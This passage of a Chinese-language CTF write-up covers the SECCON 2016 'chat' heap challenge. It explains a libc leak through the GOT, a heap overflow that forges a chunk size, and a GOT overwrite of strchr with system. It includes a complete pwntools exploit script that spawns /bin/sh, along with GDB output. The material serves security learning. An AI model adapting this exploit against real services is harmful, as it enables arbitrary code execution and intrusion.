; DATA XREF: _strdup↑r<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/a628d166-6782-4b60-9e82-3040788119a0'><img src="blob:https://tokameine.top/a628d166-6782-4b60-9e82-3040788119a0"></p>
<p>        本例中笔者通过 got表中的__libc_start_main 来泄露基址，但其他函数又是否可行呢？如下为got表对应的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gdb-peda$ tel 0x0000000000603018 16<br>0000 0x603018 --&gt; 0x7f974f791540 (&lt;__GI___libc_free&gt;:push   r13)<br>0008 0x603020 --&gt; 0x7f974f7987a0 (&lt;strlen&gt;:pxor   xmm0,xmm0)<br>0016 0x603028 --&gt; 0x4007f6 (&lt;__stack_chk_fail@plt+6&gt;:push   0x2)<br>0024 0x603030 --&gt; 0x7f974f7836c0 (&lt;setbuf&gt;:mov    edx,0x2000)<br>0032 0x603038 --&gt; 0x7f974f796b30 (&lt;__strchr_sse2&gt;:movd   xmm1,esi)<br>0040 0x603040 --&gt; 0x7f974f72d750 (&lt;__libc_start_main&gt;:push   r14)<br>0048 0x603048 --&gt; 0x7f974f77aae0 (&lt;_IO_fgets&gt;:test   esi,esi)<br>0056 0x603050 --&gt; 0x7f974f7ac5f0 (&lt;__strcmp_sse2_unaligned&gt;:mov    eax,edi)<br>0064 0x603058 --&gt; 0x7f974f762780 (&lt;__fprintf&gt;:sub    rsp,0xd8)<br>0072 0x603060 --&gt; 0x400866 (&lt;__gmon_start__@plt+6&gt;:push   0x9)<br>0080 0x603068 --&gt; 0x7f974f73ae70 (&lt;tolower&gt;:lea    edx,[rdi+0x80])<br>0088 0x603070 --&gt; 0x7f974f791180 (&lt;__GI___libc_malloc&gt;:push   rbp)<br>0096 0x603078 --&gt; 0x7f974f73add0 (&lt;isprint&gt;:mov    rax,QWORD PTR [rip+0x396041]        # 0x7f974fad0e18)<br>0104 0x603080 --&gt; 0x7f974f743e90 (&lt;atoi&gt;:sub    rsp,0x8)<br>0112 0x603088 --&gt; 0x7f974f77b6f0 (&lt;__GI__IO_fwrite&gt;:push   r14)<br>0120 0x603090 --&gt; 0x7f974f7984f0 (&lt;__GI___strdup&gt;:push   rbp)<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/bcd3d14a-7640-4a3a-8b4a-a663815bab60'><img src="blob:https://tokameine.top/bcd3d14a-7640-4a3a-8b4a-a663815bab60"></p>
<p>        如下函数为change_name时的检查：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__int64 __fastcall hash(char *a1)<br>&#123;<br>  int v2; // [rsp+1Ch] [rbp-4h]<br><br>  if ( !a1 )<br>    return 0xFFFFFFFFLL;<br>  v2 = tolower(*a1);<br>  if ( !isprint(v2) )<br>    return 0xFFFFFFFFLL;<br>  if ( v2 &gt; 96 &amp;&amp; v2 &lt;= 122 )<br>    return (v2 - 96);<br>  return 0LL;<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/22a72046-f882-4c1b-892b-281e0cbd8e0b'><img src="blob:https://tokameine.top/22a72046-f882-4c1b-892b-281e0cbd8e0b"></p>
<p>        在change_name时若没能通过该检查(第一个字符可打印)，则会注销用户</p>
<p>        如果我们替换__GI___libc_malloc函数地址，替换之前先进入hash函数进行检测，而0x7f974f791180 最后一个字符0x80为不可打印字符，则会因为free(got)导致程序crash，其他函数也是同理</p>
<p>        而反观__libc_start_main函数地址0x7f974f72d750 ，最后一个字符为0x50，为可打印字符，因此才能正常通过检测，并成功leak</p>
<p>        最后则需要伪造chunk来复写strchr的地址，笔者的exp完成leak之后，bins的情况如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">fastbins<br>0x30: 0x17730a0 ◂— 0x0<br>unsortedbin<br>all: 0x1773060 —▸ 0x7f3718172b78 (main_arena+88) ◂— 0x1773060<br>smallbins<br>0xa0: 0x1773170 —▸ 0x7f3718172c08 (main_arena+232) ◂— 0x1773170<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/4260afc5-4fe7-4240-a2b2-4224e6e6621c'><img src="blob:https://tokameine.top/4260afc5-4fe7-4240-a2b2-4224e6e6621c"></p>
<p>         0x1773060与用户malusr的user空间比较近，这块区域实则就是因为先前的remove_user而留下的，通过修改该内存块的size位即可完成heap overflow，然后通过post_tweet的方式构造payload，将0x60302a覆盖到user中的name指针处，使得该name指向0x60302a处，接下来就只需要通过change_name即可任意写got表了</p>
<h2 id="完整EXP："><a href="#完整EXP：" class="headerlink" title="完整EXP："></a>完整EXP：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#coding=utf-8<br>from pwn import *<br>import sys<br>reload(sys)<br>sys.setdefaultencoding(&#x27;utf8&#x27;)<br>context.log_level=&#x27;debug&#x27;<br><br><br>def signup(name):<br>p.sendlineafter(&#x27;&gt;&#x27;,&#x27;1&#x27;)<br>p.sendlineafter(&#x27;&gt;&#x27;,name)<br><br>def signin(name):<br>p.sendlineafter(&#x27;&gt;&#x27;,&#x27;2&#x27;)<br>p.sendlineafter(&#x27;&gt;&#x27;,name)<br><br>def changename(name):<br>p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;7&#x27;)<br>p.sendlineafter(&#x27;&gt;&gt;&#x27;,name)<br><br>def tweet(msg):<br>p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;4&#x27;)<br>p.sendlineafter(&#x27;&gt;&gt;&#x27;,msg)<br>def dm(user,msg):<br>p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;5&#x27;)<br>p.sendlineafter(&#x27;&gt;&gt;&#x27;,user)<br>p.sendlineafter(&#x27;&gt;&gt;&#x27;,msg)<br>def signout():<br>p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;0&#x27;)<br><br><br>#p=remote(&quot;node4.buuoj.cn&quot;,27256)<br>p=process(&#x27;./chat_seccon_2016&#x27;)<br>elf=ELF(&#x27;./chat_seccon_2016&#x27;)<br>libc=elf.libc<br>ua=&quot;AAAA&quot;<br>ub=&#x27;BBBB&#x27;<br>uc=&#x27;C&#x27;*30<br>signup(ua)<br>signup(ub)<br>signup(uc)<br>#gdb.attach(p)<br>signin(ua)<br>tweet(&quot;aaaa&quot;)<br>signout()<br><br>signin(ub)<br>tweet(&quot;bbbb&quot;)<br>dm(ua,&#x27;BA&#x27;)<br>dm(uc,&quot;BC&quot;)<br>signout()<br><br>signin(uc)<br>tweet(&quot;cccc&quot;)<br>signout()<br><br><br>signin(ub)<br>changename(&quot;\t&quot;)<br><br>signin(uc)<br>changename(&quot;\t&quot;)<br><br>gdb.attach(p)<br><br>ud=&#x27;d&#x27;*7<br>signup(ud)<br>signin(ud)<br>for i in xrange(6,2,-1):<br>changename(&#x27;d&#x27;*i)<br><br><br>malusr = p64(elf.got[&#x27;__libc_start_main&#x27;])<br>changename(malusr)<br>signout()<br><br>signin(ua)<br>p.sendlineafter(&quot;&gt;&gt; &quot;, &quot;2&quot;) <br>p.recvuntil(&quot;[&quot;)<br>libc.address += u64(p.recv(6).ljust(8,&quot;\x00&quot;)) - libc.symbols[&#x27;__libc_start_main&#x27;]<br>print hex(libc.address)<br>system=libc.symbols[&#x27;system&#x27;]<br>signout()<br><br>signin(malusr)<br>tweet(&quot;bins&quot;)<br><br>changename(&quot;i&quot;*24+p8(0xa1))<br>changename(p8(0x40))<br>tweet(&quot;7&quot;*16+p64(0x60302a))<br>changename(&quot;A&quot;*6+&quot;B&quot;*8+p64(system))<br>p.sendlineafter(&quot;&gt;&gt; &quot;, &quot;/bin/sh\x00&quot;)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/d7f12f97-c26d-4ac5-9513-be670dc038ae'><img src="blob:https://tokameine.top/d7f12f97-c26d-4ac5-9513-be670dc038ae"></p>
<p>         最后几行笔者打算做些适当的说明：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">changename(&quot;i&quot;*24+p8(0xa1))<br>changename(p8(0x40))<br>tweet(&quot;7&quot;*16+p64(0x60302a))<br>changename(&quot;A&quot;*6+&quot;B&quot;*8+p64(system))<br>p.sendlineafter(&quot;&gt;&gt; &quot;, &quot;/bin/sh\x00&quot;)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/5c996884-0810-4258-b864-aa7071bef7c9'><img src="blob:https://tokameine.top/5c996884-0810-4258-b864-aa7071bef7c9"></p>
<p>         第一行通过堆溢出复写chunk的size，使得然后在change_name</p>
<p>        第二行则是为了绕过change_name中的检测：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">if ( user_tbl[v3] == a1 )<br>&#123;<br>  user_tbl[v3] = a1[2];<br>&#125;<br>else<br>&#123;<br>  for ( i = user_tbl[v3]; i &amp;&amp; *(i + 16) != a1; i = *(i + 16) )<br>    ;<br>  if ( !i )<br>    return 0xFFFFFFFFLL;<br>  *(i + 16) = a1[2];<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/d6347f7c-76c6-4a1d-a29c-e1885db2488d'><img src="blob:https://tokameine.top/d6347f7c-76c6-4a1d-a29c-e1885db2488d"></p>
<p>        如果缺少该行，第4行将会因为上述检测返回“-1”导致没能正确写入 </p>
<p>        经过笔者的测试，最终只要保证修改内容为“<strong>非字母”</strong>均可通过</p>
<p>       其原因为：第二行的复写让当前用户user指针被放入user_tbl，而在第4行时将对user_tbl进行检测；由于我们选择了__stack_chk_fail的最后一个字节作为新chunk的size位，其值为0x40，将会获得索引“0”，如果第二行使用任意“字母”，则返回的索引均为“非零”值，在上述检测里就没办法通过第一个判断了，而在另外一个循环里更加难以通过检查，因此事先user指针放入user_tbl[0]中，然后在接下来的改名里绕过检查</p>
<p>        最后就是一系列的复写了 ​</p>
<p>插画ID：91814284</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2021/08/29/srop1/">← Next 360chunqiu2017_smallest —— 从例题理解SROP</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2021/08/09/babyheap-0ctf-2017/">FastBinAttack实战 - babyheap_0ctf_2017 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/6.png" alt="Logo"></a><h1 id="Dr"><a href="TokameinE">TokameinE</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/ErodedElk"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://space.bilibili.com/1782544616"><i class="fa-brands fa-bilibili" alt="BiliBili"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E6%96%87%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">正文：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">函数：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析与利用：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4EXP%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">完整EXP：</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>